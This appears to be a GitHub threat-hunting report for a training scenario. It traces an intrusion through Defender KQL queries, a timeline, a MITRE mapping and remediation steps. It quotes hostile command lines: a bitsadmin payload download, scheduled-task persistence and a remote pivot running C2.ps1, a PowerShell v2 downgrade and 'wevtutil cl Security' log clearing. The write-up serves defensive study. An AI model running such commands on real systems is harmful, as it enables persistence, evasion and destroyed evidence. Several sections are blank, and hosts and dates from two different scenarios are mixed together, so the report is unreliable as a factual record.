# Threat-Hunting-Port-of-Entry-Jade-Spider-APT-
INCIDENT BRIEF - Azuki Import/Export - 梓貿易株式会社 SITUATION:   COMPANY: Azuki Import/Export Trading Co. - 23 employees, shipping logistics Japan/SE Asia  EVIDENCE AVAILABLE: Microsoft Defender for Endpoint logs


# 🕵️‍♀️ Threat Hunt Report: **Lurker**

Analyst: Fredrick Wilson

Date Completed: 11/25/2025

Environment Investigated: 

Timeframe: 11/20/2025

## 🧠 Scenario Overview

Competitor undercut our 6-year shipping contract by exactly 3%. Our supplier contracts and pricing data appeared on underground forums.

---

## 🎯 Executive Summary




---

## ✅ Completed Flags

| Flag # | Objective | Value |
|--------|-----------|-------|
| **Start** | 
| **1** | 
| **2** | 
| **3** | 
| **4** | 
| **5** | 
| **6** | 
| **7** | 
| **8** | 
| **9** | 
| **10** | 
| **11** | 
| **12** | 
| **13** | 
| **14** | 
| **15** | 
| **16** | |
| **17** | 

---
## Flag by Flag

### Starting Point – 

**Objective:**


**Intel Given:**


**Identified System:**
michaelvm

**Reasoning:**


- First seen: 

- Last seen: 



**KQL Query Used:**
```
DeviceProcessEvents

```



### 🪪 Flag 1 – INITIAL ACCESS - Remote Access Source

**Objective:**
Remote Desktop Protocol connections leave network traces that identify the source of unauthorised access. Determining the origin helps with threat actor attribution and blocking ongoing attacks.

**What to Hunt:**
Query logon events for interactive sessions from external sources during the incident timeframe.

**Identified Activity:**
88.97.178.12 is the source IP address of the Remote Desktop Protocol Connection

**Why It Matters:**
This PowerShell command represents the earliest deviation from baseline behavior on the compromised host michaelvm. The use of -ExecutionPolicy Bypass indicates a deliberate attempt to circumvent PowerShell script restrictions — a common tactic for initial payload deployment.

**KQL Query Used:**
```
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-18) .. datetime(2025-11-21))
| where RemoteIP contains "."
| where ActionType == "LogonSuccess"
| project Timestamp, ActionType, AccountName,  RemoteIP, RemoteIPType, RemoteDeviceName
| order by Timestamp asc
```
<img width="1739" height="382" alt="image" src="https://github.com/user-attachments/assets/0a155b6a-d56c-477c-9cf5-6f8f08e15e52" />



### 🛰️ Flag 2 – INITIAL ACCESS - Compromised User Account

**Objective:**
Identifying which credentials were compromised determines the scope of unauthorised access and guides remediation efforts, including password resets and privilege reviews.

**What to Hunt:**
Focus on the account that authenticated during the suspicious remote access session. Cross-reference the logon event timestamp with the external IP connection.

**Identified User Account:**
kenji.sato

**Why It Matters:**


**KQL Query Used**
```
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-18) .. datetime(2025-11-21))
| where RemoteIP contains "."
| where ActionType == "LogonSuccess"
| project Timestamp, ActionType, AccountName,  RemoteIP, RemoteIPType, RemoteDeviceName
| order by Timestamp asc
```
<img width="1739" height="382" alt="image" src="https://github.com/user-attachments/assets/346167c5-d6b6-4374-a139-d1db62b494b6" />



### 📄 Flag 3 – DISCOVERY - Network Reconnaissance

**Objective:**
Look for commands that reveal local network devices and their hardware addresses.

**What to Hunt:**
Look for file access involving keywords like board, financial, or crypto — especially in user folders. Check DeviceProcessEvents for network enumeration utilities executed after initial access.

**Identified Command:**
"ARP.EXE" -a

**Why It Matters:**


**KQL Query Used:**
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
| project Timestamp, DeviceName, ProcessCommandLine, FolderPath, AccountName, IsProcessRemoteSession
```
<img width="1709" height="488" alt="image" src="https://github.com/user-attachments/assets/2321e140-cf3b-4c28-ae5a-91a90feb3a6c" />



### ⏱️ Flag 4 – DEFENCE EVASION - Malware Staging Directory

**Objective:**
Attackers establish staging locations to organise tools and stolen data. Identifying these directories reveals the scope of compromise and helps locate additional malicious artefacts.

**What to Hunt:**
Search for newly created directories in system folders that were subsequently hidden from normal view. Look for mkdir or New-Item commands followed by attrib commands that modify folder attributes.

**PRIMARY Staging Directory Found:**
C:\ProgramData\WindowsCache

**Why It Matters:**



**KQL Query Used:**
```
DeviceFileEvents
| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
| where DeviceName == "azuki-sl"
| where InitiatingProcessFileName contains "powershell"
```
<img width="1679" height="432" alt="image" src="https://github.com/user-attachments/assets/1dd10cdd-be4d-4e5c-af6d-463cdd687371" />



### ⚙️ Flag 5 – LOLBin Usage: bitsadmin

**Objective:**
Identify a stealthy download executed using native Windows utilities.

**What to Hunt:**
Look for executions of bitsadmin.exe with URLs and local paths — common signs of file transfer abuse.

**Identified Command:**
"bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe

**Why It Matters:**
bitsadmin.exe is a living-off-the-land binary (LOLBin) often abused by attackers to download payloads while bypassing traditional security tools. In this case, a file named crypto_toolkit.exe was silently fetched and stored as market_sync.exe in the user’s Temp directory — an early-stage staging indicator.

**KQL Query Used:**
```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where ProcessCommandLine contains "bitsadmin.exe"
| project Timestamp, DeviceName,FileName , ProcessCommandLine, InitiatingProcessFileName
| sort by Timestamp asc
```
<img width="1593" height="146" alt="8c64117d-905c-45e7-a06d-870483997136" src="https://github.com/user-attachments/assets/90c04309-ae3c-4937-a477-50bd1f00f80f" />


### 💾 Flag 6 – Suspicious Payload Deployment

**Objective:**
Identify executable payloads dropped in nonstandard or staging directories.

**What to Hunt:**
Look for .exe files created in folders like Temp, AppData, or Downloads — especially those with deceptive or business-related names.

**Identified Payload:**

- File Name: ledger_viewer.exe

- Folder Path: C:\Users\Mich34L_id\AppData\Local\Temp\ledger_viewer.exe

- Device: michaelvm

**Why It Matters:**
The executable ledger_viewer.exe appears financial in nature but was deployed into the user’s Temp directory, a common location used for staging malware. The naming suggests an attempt to blend in as a legitimate utility, aligning with pre-execution payload setup.

**KQL Query Used:**
```
DeviceFileEvents
| where DeviceName == "michaelvm"
| where FileName contains "ledger"
| where FileName contains "exe"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath
```

<img width="1177" height="90" alt="df258a37-6bd0-40a1-8d68-17c518e7f47a" src="https://github.com/user-attachments/assets/9e786a76-ae6e-4b73-b779-2b85d688c6c0" />


### 📎 Flag 7 – HTA Abuse via LOLBin

**Objective:**
Detect the execution of HTML Application (.hta) files using trusted Windows tools.

**What to Hunt:**
Look for execution of mshta.exe pointing to local .hta scripts, particularly those in Temp or AppData directories.

**Identified Command**
"mshta.exe" C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta

**Why It Matters:**
HTA files can embed VBScript or JavaScript and are executed by mshta.exe, a native Windows binary. This method is frequently used in social engineering attacks to bypass traditional script execution restrictions. In this case, the attacker leveraged a file named client_update.hta located in a Temp folder — a strong signal of malicious intent.

KQL Query Used:
```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where ProcessCommandLine contains "mshta.exe"
| project Timestamp, DeviceName, ProcessCommandLine
```

<img width="894" height="137" alt="fdcd5a52-b6e2-47c3-81b5-35e8ffa1054c" src="https://github.com/user-attachments/assets/69183010-6fa7-4e38-b64d-3829538e7775" />



### 🗂️ Flag 8 – ADS Execution Attempt

**Objective:**
Track whether attackers used Alternate Data Streams (ADS) to hide or execute malicious payloads.

**What to Hunt:**
Look for .dll files appearing in suspicious paths (e.g., Temp folders), especially with filenames that resemble legitimate content (like reports or documents). These are often attached to other files or launched via trusted processes.

**Identified Artifact:**

- File Name: investor_report.dll

- Folder Path: C:\Users\Mich34L_id\AppData\Local\Temp\investor_report.dll

- Initiating Process: powershell.exe

- SHA1 Hash: 801262e122db6a2e758962896f260b55bbd0136a

- Timestamp: 2025-06-16T06:32:09.4710257Z

**Why It Matters:**
The DLL’s name — investor_report.dll — closely mimics a legitimate document title, likely as a disguise. Coupled with its placement in a Temp directory and launch via PowerShell, this strongly suggests it may have been used in an ADS-based or stealth execution technique. ADS attacks are commonly used to hide execution trails by appending malicious DLLs to innocuous file containers (e.g., document.docx:hidden.dll).

**KQL Query Used:**
```
DeviceFileEvents
| where Timestamp > datetime("2025-06-16T06:15:37.4710257Z")
| where DeviceName == "michaelvm"
| where FileName contains "dll"
| where FolderPath has @"C:\Users\Mich34L_id\AppData\Local\Temp"
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessSHA1
```
<img width="612" height="261" alt="05cf2159-9c1c-4802-946f-d37a78ac5ab5" src="https://github.com/user-attachments/assets/b694fa48-e98e-49f7-97c8-15bea1fb55cf" />


### 🗝️ Flag 9 – Registry Persistence Confirmation

**Objective:**
Confirm that the attacker established persistence by writing to a registry autorun key.

**What to Hunt:**
Look for modification of autorun keys under HKCU\...\CurrentVersion\Run — a common persistence technique that triggers script or binary execution at user logon.

**Identified Registry Entry:**

- Key Path:
HKEY_CURRENT_USER\S-1-5-21-2654874317-2279753822-948688439-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

- Value Name: WalletUpdater

- Action Type: RegistryValueSet

- Initiating Process: powershell.exe

- Timestamp: 2025-06-16T06:41:24.1068836Z

- Device: michaelvm

**Why It Matters:**
Persistence via registry is a low-friction, high-reliability method that survives reboots and evades detection if disguised. The name WalletUpdater mimics legitimate crypto-related software, indicating social engineering or camouflage intent. This persistence path ensures the attack script or loader runs on each user session start.

**KQL Query Used:**
```
DeviceRegistryEvents
| where DeviceName == "michaelvm"
| where RegistryKey has @"Currentversion\run"
| project Timestamp, DeviceName, ActionType, RegistryKey, PreviousRegistryKey, RegistryValueName, PreviousRegistryValueName, InitiatingProcessCommandLine
```

<img width="1068" height="234" alt="24aabf33-c115-4f50-8776-75412ceb6a27" src="https://github.com/user-attachments/assets/12237500-7e73-4d93-b88d-513fd7ee17d8" />


### ⏰ Flag 10 – Scheduled Task Execution

**Objective:**
Validate the scheduled task that launches the attacker’s payload.

**What to Hunt:**
Track the creation of scheduled tasks (schtasks.exe) with suspicious names or pointing to staging directories (e.g., Temp).

**Identified Scheduled Task:**

- Task Name: MarketHarvestJob

- Command Line: schtasks /Create /SC ONLOGON /TN "MarketHarvestJob" /TR powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta" /RL HIGHEST /F

- Folder Path: C:\Windows\System32\schtasks.exe

- Initiating Process: cmd.exe launched by powershell.exe

- Device: michaelvm

- Timestamp: 2025-06-15T19:52:39

**Why It Matters:**
The attacker created a scheduled task named MarketHarvestJob to persistently execute a malicious HTA file using powershell.exe. This task triggers on user logon, ensuring the payload re-executes even after reboots — a common persistence mechanism seen in fileless malware deployments.

**Note:** The command uses multiple evasion techniques: -WindowStyle Hidden, -ExecutionPolicy Bypass, and placement in a trusted Temp directory to blend in and reduce detection risk.

**KQL Query Used:**
```
DeviceProcessEvents
| where Timestamp > datetime("2025-06-16T06:41:24.1068836Z")
| where DeviceName == "michaelvm"
| where FileName contains "schtask"
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessParentFileName
```

<img width="1655" height="525" alt="e607b4d1-a060-40e5-a3ce-ec0a64c76e15" src="https://github.com/user-attachments/assets/a70760a0-4f63-4155-9cd0-2762cd92e1d4" />



### 🧭 Flag 11 – Target of Lateral Movement

**Objective:**
Identify which remote machine the attacker pivoted to after compromising the initial host.

**What to Hunt:**
Search for remote command-line operations, especially those involving /S and /U flags (remote system and user) within tools like schtasks.exe or wmic.exe.

**Identified Lateral Movement Target:**

- Remote System: centralsrvr

- Command Line: schtasks.exe /Create /S centralsrvr /U centralsrvr\\adminuser /P ********** /TN RemoteC2Task /TR "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\C2.ps1" /SC ONLOGON

- Originating Host: michaelvm

- Initiating Process: powershell.exe

- Initiating Parent: RuntimeBroker.exe

- Timestamp: 2025-06-16T08:32:34.9799062Z

**Why It Matters:**
The attacker attempted to remotely schedule a task on centralsrvr using valid admin credentials. This suggests either credential theft or insider access. The use of a PowerShell C2 script (C2.ps1) and placement in C:\Users\Public\ points to a stealthy, fileless command-and-control strategy. This marks initial lateral movement, indicating the breach is spreading.

**KQL Query Used:**
```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where Timestamp > datetime("2025-06-16T06:41:24.1068836Z")
| where ProcessCommandLine has @"/U"
| where ProcessCommandLine has @"/S"
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessParentFileName
```
<img width="1435" height="783" alt="1fe6deca-9bc1-4dd5-bd00-1823d7645b4f" src="https://github.com/user-attachments/assets/f7b74394-73f6-4bc8-901a-ec64b1338d88" />


### ⏱️ Flag 12 – Lateral Move Timestamp

**Objective:**
Pinpoint the exact time that lateral movement to the second host occurred.

**What to Hunt:**
Review command-line executions targeting remote systems using /S and /U, especially via tools like schtasks.exe. Focus on the last known timestamp that initiated remote actions.

**Identified Execution Time:**

- Timestamp: 2025-06-17T03:00:49.525038Z

- Remote System Targeted: centralsrvr

- Originating Host: michaelvm

- Process Used: schtasks.exe

**Why It Matters:**
This timestamp marks the last recorded instance of lateral activity from the compromised michaelvm system. It provides a critical anchor point for reconstructing the adversary's timeline, containment actions, and correlation with further compromise events on centralsrvr.

**KQL Query Used:**
```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where Timestamp > datetime("2025-06-16T06:41:24.1068836Z")
| where ProcessCommandLine has @"/U"
| where ProcessCommandLine has @"/S"
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessParentFileName
```
<img width="1418" height="231" alt="b5c1c5a2-4086-4bd7-acdd-aa32f48c6000" src="https://github.com/user-attachments/assets/89e63654-2a16-405b-b9e6-aa92af7cdd04" />


### 📂 Flag 13 – Sensitive File Access

**Objective:**
Reveal which specific document the attacker targeted on the second host.

**What to Hunt:**
Search for access to high-value or confidential documents, particularly those that match known filenames or hashes from previous host compromises.

**Confirmed Sensitive File Accessed:**

- Filename: QuarterlyCryptoHoldings.docx

- SHA256 Hash: b4f3a56312dd19064ca89756d96c6e47ca94ce021e36f818224e221754129e98

- Folder Path: C:\Users\centralsrvrID\Documents\BoardMinutes\QuarterlyCryptoHoldings.docx

- Access Type: SensitiveFileRead

- Timestamp: 2025-06-17T22:23:24Z

- Target Host: centralsrvr

- Remote Session Origin: MICHA3L

**Why It Matters:**
The attacker specifically sought the same financial document (QuarterlyCryptoHoldings.docx) that was previously accessed on michaelvm. This continuity strongly implies the adversary had a defined financial motive and confirms lateral access was not opportunistic — it was goal-oriented data theft.

**KQL Queries Used:**
```
DeviceEvents
| where DeviceName == "centralsrvr"
| where Timestamp > datetime("2025-06-16T06:41:24.1068836Z")
| where FileName == "QuarterlyCryptoHoldings.docx"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessRemoteSessionDeviceName

DeviceFileEvents
| where DeviceName == "centralsrvr"
| where Timestamp > datetime("2025-06-16T06:41:24.1068836Z")
| where FileName == "QuarterlyCryptoHoldings.docx"
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessRemoteSessionDeviceName
```
<img width="561" height="202" alt="a40dc9b7-1bd7-462b-9c88-a9f4e7d29a5e" src="https://github.com/user-attachments/assets/3ed4ade9-a9c2-4dac-a26d-ef0bdd17955b" />

<img width="788" height="196" alt="f60c94a2-c756-4ba3-8704-27d3ff921ea1" src="https://github.com/user-attachments/assets/0930c33e-4992-4961-beeb-75ce06098167" />



### ☁️ Flag 14 – Data Exfiltration Attempt

**Objective:**
Validate that outbound activity occurred, and determine which process was responsible for initiating the exfiltration.

**What to Hunt:**
Outbound network connections to cloud storage or paste services — particularly with valid InitiatingProcessMD5 values that point to suspicious or newly observed binaries.

**Confirmed Exfiltration Behavior:**

MD5 Hash: 2e5a8590cf6848968fc23de3fa1e25f1

**Remote URLs Accessed:**

- drive.google.com

- dropbox.com

- www.dropbox.com

- pastebin.com

**Remote Session Origin:** MICHA3L

**Device:** centralsrvr

**Timestamps:**

2025-06-17T22:23:24Z → Google Drive

2025-06-17T22:23:28Z → Dropbox (2 entries)

2025-06-17T22:23:31Z → Pastebin

**Why It Matters:**
The repeated outbound traffic to Google Drive, Dropbox, and Pastebin confirms that data was likely exfiltrated using trusted cloud services. The process responsible (based on the matching MD5) was consistently active across multiple destinations in rapid succession — indicating automation or scripted behavior.

This type of behavior is common in attacks involving:

- Command-and-control (C2) over legitimate platforms

- Data exfiltration masquerading as routine cloud traffic

- Anti-detection via encrypted TLS channels

**KQL Query Used:**
```
DeviceNetworkEvents
| where DeviceName == "centralsrvr"
| where Timestamp > datetime("2025-06-16")
| where RemoteUrl != ""
| where InitiatingProcessRemoteSessionDeviceName != ""
| project Timestamp, DeviceName, RemoteUrl, InitiatingProcessMD5, InitiatingProcessRemoteSessionDeviceName
```

<img width="1193" height="136" alt="f3440e1b-0787-4bbd-b0df-c9fa53fde588" src="https://github.com/user-attachments/assets/940171b9-78e2-448f-bf9c-e3a0d102d5da" />


### 🌐 Flag 15 – Destination of Exfiltration

**Objective:**
Identify the final IP address used for outbound data exfiltration.

**What to Hunt:**
Connections to remote IPs associated with unauthorized or public cloud services (e.g., Pastebin, Dropbox, Google Drive), often abused to exfiltrate sensitive data.

**Confirmed Exfiltration Endpoint:**

- Remote IP: 104.22.69.199

- Resolved Domain: pastebin.com

- Device: centralsrvr

- Session Origin: MICHA3L

- Timestamp: 2025-06-17T22:23:31Z

**Why It Matters:**
The IP 104.22.69.199 is associated with pastebin.com, a common data dump and exfiltration site abused by attackers due to its anonymity and accessibility. This connection marks the final confirmed outbound transmission, likely containing sensitive financial data previously accessed.

This finding validates:

- The attacker used Pastebin as an exfiltration destination.

- The same process that initiated connections to Google Drive and Dropbox (see Flag 14) also ended the operation here.

- Timeline correlation can help identify full data loss scope and inform incident containment and forensics review.

**KQL Query Used (with IP projection):**
```
DeviceNetworkEvents
| where DeviceName == "centralsrvr"
| where Timestamp > datetime("2025-06-16")
| where RemoteUrl != ""
| where RemoteIP != ""
| where InitiatingProcessRemoteSessionDeviceName != ""
| project Timestamp, DeviceName, RemoteUrl, RemoteIP, InitiatingProcessMD5, InitiatingProcessRemoteSessionDeviceName
```

<img width="1193" height="136" alt="1c33beda-2d23-421c-8212-dd1b6f98aaf2" src="https://github.com/user-attachments/assets/83abad89-3ceb-4cfa-b560-d96b8584436c" />



### 🧬 Flag 16 – PowerShell Downgrade Detection

**Objective:**
Detect the use of PowerShell version downgrade flags (-Version 2), often used to evade logging mechanisms like AMSI and Script Block Logging.

**What to Hunt:**
Command-line execution of powershell.exe with the -Version 2 parameter, which forces the session into legacy compatibility mode and bypasses modern security instrumentation.

**Confirmed Downgrade Attempt:**

- Timestamp: 2025-06-18T10:52:59.0847063Z

- Device: centralsrvr

- Command Line: powershell.exe -Version 2 -NoProfile -ExecutionPolicy Bypass -NoExit

- Remote Session Origin: MICHA3L

**Why It Matters:**
PowerShell v2 lacks critical security features such as:

- Script Block Logging

- AMSI Integration

- Module Logging

This downgrade attempt is a clear evasion tactic, often used in advanced persistent threat (APT) operations and red team simulations. Its presence strongly suggests an effort to avoid detection during payload execution or lateral scripting.

**KQL Query Used:**
```
DeviceProcessEvents
| where DeviceName == "centralsrvr"
| where ProcessCommandLine contains "-Version 2"
| project Timestamp, DeviceName, ProcessCommandLine, ProcessRemoteSessionDeviceName
```

<img width="700" height="138" alt="53744d85-908b-4392-8d19-a888e73a762b" src="https://github.com/user-attachments/assets/161779b7-258d-49ab-9f29-4f7edb2ec349" />


### 🧹 Flag 17 – Log Clearing Attempt

**Objective:**
Detect if the attacker attempted to clear system logs to destroy forensic evidence and cover their tracks.

**What to Hunt:**
Look for execution of: wevtutil cl Security

This command clears the Security Event Log, which contains crucial evidence such as logon events, privilege escalations, and policy changes.

**Confirmed Log Wipe Action:**

- Process: wevtutil.exe

- Command Line: wevtutil.exe cl Security

- Process Creation Timestamp: 2025-06-18T10:52:33.3030998Z

- Device: centralsrvr

- Remote Session Origin: MICHA3L

**Why It Matters:**
Clearing logs is an overt attempt to erase visibility into prior attacker activity. It’s often the last move before exfiltration or attacker exit, especially in hands-on-keyboard intrusions. This event signals a shift from persistence to cleanup and departure, and it must be treated as an urgent containment and recovery milestone.

**KQL Query Used:**
```
DeviceProcessEvents
| where DeviceName == "centralsrvr"
| where ProcessCommandLine contains "cl Security"
| project Timestamp, DeviceName, FileName, ProcessCommandLine, ProcessCreationTime, ProcessRemoteSessionDeviceName
```
<img width="436" height="195" alt="703a42c4-90d7-4cde-a55b-afff1197e0c2" src="https://github.com/user-attachments/assets/5ef30f00-e5d1-4758-a0c7-1320f34454ca" />



---

## 🔍 Timeline of Events

| **Timestamp (UTC)**                | **Event**                                                         | **Device**  | **Details**                                                      |
| ---------------------------------- | ----------------------------------------------------------------- | ----------- | ---------------------------------------------------------------- |
| **2025-06-14 15:38:45**            | First activity detected on `michaelvm`                            | michaelvm   | Initial signs of temp folder execution                           |
| **2025-06-15 (evening)**           | Scheduled Task created                                            | michaelvm   | `MarketHarvestJob` set to run client\_update.hta with PowerShell |
| **2025-06-16 05:56:59**            | Reconnaissance via `net group "Domain Admins"` command            | michaelvm   | SHA256: `badf4752413...` initiated from PowerShell               |
| **2025-06-16 06:12:28**            | Sensitive document accessed: `QuarterlyCryptoHoldings.docx`       | michaelvm   | From folder `Documents\BoardMinutes`                             |
| **2025-06-16 06:32:09**            | ADS-style DLL `investor_report.dll` dropped                       | michaelvm   | SHA1: `801262e122db...` in Temp folder                           |
| **2025-06-16 06:41:24**            | Registry persistence established via autorun key                  | michaelvm   | Key: `HKCU\...\Run` with value `WalletUpdater`                   |
| **2025-06-16 08:32:34**            | Lateral movement command to `centralsrvr` executed via `schtasks` | michaelvm   | Command targets `centralsrvr` using credentials                  |
| **2025-06-17 03:00:49**            | Last lateral movement command confirmed                           | michaelvm   | Final pivot toward `centralsrvr`                                 |
| **2025-06-17 22:23:24**            | Sensitive document accessed on `centralsrvr`                      | centralsrvr | `QuarterlyCryptoHoldings.docx` accessed remotely by `MICHA3L`    |
| **2025-06-17 22:23:28 – 22:23:31** | Data exfiltration attempts to: Google Drive, Dropbox, Pastebin    | centralsrvr | MD5: `2e5a8590cf68...`                                           |
| **2025-06-18 10:52:33**            | Event log clearing with `wevtutil cl Security`                    | centralsrvr | Attempt to wipe forensic evidence                                |
| **2025-06-18 10:52:59**            | PowerShell downgrade to v2 for evasion                            | centralsrvr | Likely to disable ScriptBlock/AMSI logging                       |


---

## 🧩 MITRE ATT&CK Mapping

| **Flag/Event**                       | **Tactic** (TA#)                | **Technique** (T#)                                      | **Details**                                                         |
| ------------------------------------ | ------------------------------- | ------------------------------------------------------- | ------------------------------------------------------------------- |
| **Initial PowerShell Execution**     | Execution (TA0002)              | T1059.001 – PowerShell                                  | Bypass flag used to execute `.ps1` script from user directory       |
| **Recon: Domain Admins Query**       | Discovery (TA0007)              | T1069.002 – Domain Groups                               | Recon via `net group "Domain Admins"` from PowerShell               |
| **Sensitive File Access**            | Collection (TA0009)             | T1005 – Data from Local System                          | Accessed `QuarterlyCryptoHoldings.docx` in `Documents\BoardMinutes` |
| **bitsadmin.exe Download**           | Command and Control (TA0011)    | T1105 – Ingress Tool Transfer                           | Used `bitsadmin.exe` to download a payload stealthily               |
| **Payload Drop: ledger\_viewer.exe** | Execution (TA0002)              | T1204.002 – User Execution: Malicious File              | Fake financial viewer dropped in Temp folder                        |
| **HTA Abuse via mshta.exe**          | Execution (TA0002)              | T1218.005 – mshta                                       | Used to execute malicious `client_update.hta`                       |
| **ADS DLL Drop**                     | Defense Evasion (TA0005)        | T1564.004 – Hidden Files and Directories: ADS           | DLL (`investor_report.dll`) mimicked hidden stream behavior         |
| **Registry Persistence**             | Persistence (TA0003)            | T1547.001 – Registry Run Keys                           | Added `WalletUpdater` entry to HKCU autorun                         |
| **Scheduled Task Creation**          | Persistence (TA0003), Execution | T1053.005 – Scheduled Task/Job: Scheduled Task          | `MarketHarvestJob` created for logon persistence                    |
| **Lateral Movement via schtasks**    | Lateral Movement (TA0008)       | T1021.003 – Remote Services: Windows Admin Shares       | schtasks used with `/S` to pivot to `centralsrvr`                   |
| **Remote Document Access**           | Collection (TA0009)             | T1213 – Data from Information Repositories              | Remote access to same financial doc from second host                |
| **Exfiltration to Pastebin/Cloud**   | Exfiltration (TA0010)           | T1048.003 – Exfiltration Over Alternative Protocol      | Exfil to Google Drive, Dropbox, Pastebin                            |
| **PowerShell Downgrade**             | Defense Evasion (TA0005)        | T1059.001 + T1562.001 – Input Capture + Disable Logging | Downgrade to PowerShell v2 to evade modern logging                  |
| **Log Clearing**                     | Defense Evasion (TA0005)        | T1070.001 – Clear Windows Event Logs                    | `wevtutil.exe cl Security` used prior to exit                       |


---

## 💠 Diamond Model Summary

| **Feature**        | **Details**                                                                                                                                                                                                                              |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Adversary**      | - Likely a hands-on-keyboard threat actor or red team simulation using stealthy, multi-stage execution.<br>- Demonstrated knowledge of LOLBins, evasion tactics, and lateral movement.                                                   |
| **Infrastructure** | - External command & control via cloud services: `drive.google.com`, `dropbox.com`, `pastebin.com`, `104.22.69.199`.<br>- Delivery and execution through living-off-the-land binaries (`bitsadmin.exe`, `mshta.exe`, `wevtutil.exe`).    |
| **Capability**     | - PowerShell scripts with execution policy bypass and version downgrade for AMSI evasion.<br>- Recon tools (`net group`), ADS payloads, scheduled tasks, and registry persistence.<br>- Data exfiltration over alternative web channels. |
| **Victim**         | - Initial: `michaelvm` (entry point)<br>- Lateral: `centralsrvr`<br>- Targeted files: `QuarterlyCryptoHoldings.docx` on both machines<br>- Sensitive folder paths and scheduled tasks abused for persistence and access.                 |
---
## 💡 Key Relationships:
- Adversary used capability (PowerShell, LOLBins, recon, persistence) on victim (michaelvm, then centralsrvr)

- Adversary leveraged infrastructure (public cloud services + native tools) to exfiltrate data

- Capability enabled movement from initial compromise to expansion and cleanup

---

## ✅ Conclusion

The Lurker threat scenario exposed a stealthy multi-phase intrusion that began with the abuse of PowerShell and native Windows tools and evolved into a targeted data exfiltration campaign. The adversary executed with precision, leveraging legitimate binaries (LOLBins), social engineering payloads, registry and scheduled task persistence, and evasion techniques such as PowerShell version downgrades and event log clearing.

Through forensic analysis of process events, file reads, registry changes, and network activity, we successfully reconstructed the adversary’s kill chain across two compromised systems: michaelvm and centralsrvr.

---

## 🧠 Lessons Learned
- **Initial Access Often Mimics Legitimate Use**
  
 PowerShell activity from user folders with policy bypass flags should raise alerts even when they look routine.

- **LOLBin Abuse Is a Persistent Risk**

 Adversaries increasingly favor native tools (bitsadmin, mshta, wevtutil) to avoid detection by EDRs.

- **Persistence Tactics Are Layered**

 Registry keys and scheduled tasks were both used, ensuring the attacker maintained control across reboots.

- **Cloud Services Can Be Used for Exfiltration**

 Dropbox, Google Drive, and Pastebin were all leveraged for outbound data transfers, evading traditional filters.

- **Downgrade Attacks Undermine Modern Logging**

 PowerShell downgrade to Version 2 disabled script block logging and AMSI defenses.

- **Cleaning Logs ≠ Cleaning Up**

 Even though logs were cleared, timestamps and forensic remnants allowed a full attack reconstruction.

---

## 🛡 Remedial Actions
1. **Enhance PowerShell Monitoring**

- Enforce Constrained Language Mode

- Block execution of PowerShell v2 where possible

- Enable deep script block logging and central collection

2. **Detect and Block LOLBin Abuse**

- Alert on uncommon use of mshta.exe, bitsadmin.exe, and wevtutil.exe

- Use allow-listing to limit legitimate LOLBin usage

3. **Harden Persistence Defenses**

- Monitor HKCU\Software\Microsoft\Windows\CurrentVersion\Run

- Detect suspicious scheduled task creation by non-admin users

4. **Restrict Outbound Access to Known Cloud Services**

- Block access to file-sharing platforms not explicitly approved (e.g., Dropbox, Pastebin)

- Use CASB or DLP to inspect cloud-bound traffic

5. **Implement Lateral Movement Protections**

- Audit schtasks.exe usage with remote /S flag

- Require MFA and remove excessive admin privileges

6. **Automate Log Integrity Verification**

- Set alerts for wevtutil cl activity

- Forward logs to a secure, remote SIEM that is tamper-resistant
